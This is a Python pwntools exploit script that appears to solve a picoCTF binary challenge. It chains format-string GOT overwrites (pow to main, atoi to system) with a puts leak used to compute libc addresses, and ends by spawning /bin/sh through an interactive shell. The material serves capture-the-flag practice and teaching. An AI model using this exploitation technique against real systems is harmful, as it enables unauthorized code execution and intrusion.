#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'info'
host, port = 'mars.picoctf.net', 31929

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
io = initialize()

# fuzzing values and finding offset
# io.sendlineafter(b'A:', b'1 %11$lx')
# io.sendlineafter(b'B', b'1-------AAAAAAAA')

# overwriting GOT pow() to main()
# somehow pwntools is buggy and overwrote the bytes more than 0x1b 
# the 0x00 is because main has 00 on its 2nd bytes
A = b'1-------' + fmtstr_payload(11, {elf.got['pow']: elf.sym['main'] - 0x1b001b}, numbwritten=0)
B = b'1'

io.sendlineafter(b'A:', A)
io.sendlineafter(b'B', B)

# leaking libc
A = b'1-------' + p64(elf.got['puts'])
B = b'1 %11$s'

io.sendlineafter(b'A:', A)
io.sendlineafter(b'B', B)

# receiving leak
io.recvuntil(b'B: 1 ')
puts_leak = unpack(io.recvline()[:-1].ljust(8, b'\x00'))

# calculating libc addresses, based on libc6_2.31-0ubuntu9_amd64 
libc_base = puts_leak - 0x0875a0
system = libc_base + 0x055410

# local 
# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "{function}"
# libc_base = puts_leak - 0x77820
# system = libc_base + 0x4c330

# overwriting GOT atoi() with system()
# somehow pwntools is buggy and overwrote the bytes more than 0x1b
# also overwrote the last 3 offset less than 0x100 for some reason
A = b'1-------' + fmtstr_payload(11, {elf.got['atoi']: system - 0x1b1b1b1b1b1b + 0x100}, numbwritten=0)
B = b'1'

io.sendlineafter(b'A:', A)
io.sendlineafter(b'B', B)

# set 1st param to /bin/sh
io.sendlineafter(b'A:', b'/bin/sh\x00')
io.sendlineafter(b'B', B)

# info logs at end, easier to grab
info('puts leak: %#x', puts_leak)
info('libc base: %#x', libc_base)
info('system addr: %#x', system)

io.interactive()